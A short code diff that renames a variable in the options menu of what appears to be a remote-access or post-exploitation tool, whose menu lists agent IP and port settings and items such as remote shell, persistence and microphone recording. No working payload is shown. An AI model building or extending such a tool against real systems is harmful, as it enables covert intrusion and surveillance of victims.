@@ -5,7 +5,7 @@ class Options():
     slot = ["DATA INPUT", "IP INPUT", "PORT INPUT", "AGENT IP: ", "AGENT PORT: ", "GENERATE", "APP",
              "APP LOCATION", "STAGE MODE", "NOTIFICATION TITLE",
                "NOTIFICATION TEXT", "NOTIFICATION APP", "NOTIFICATION", "POST EXPLOIT", "CONTROLLER", "MODULE SELECTION", "SELECTION"]
-    agent_options = f"""\n
+    shell_options = f"""\n
             1   -   Remote Shell
             2   -   Create Persistence
             3   -   Record Microphone
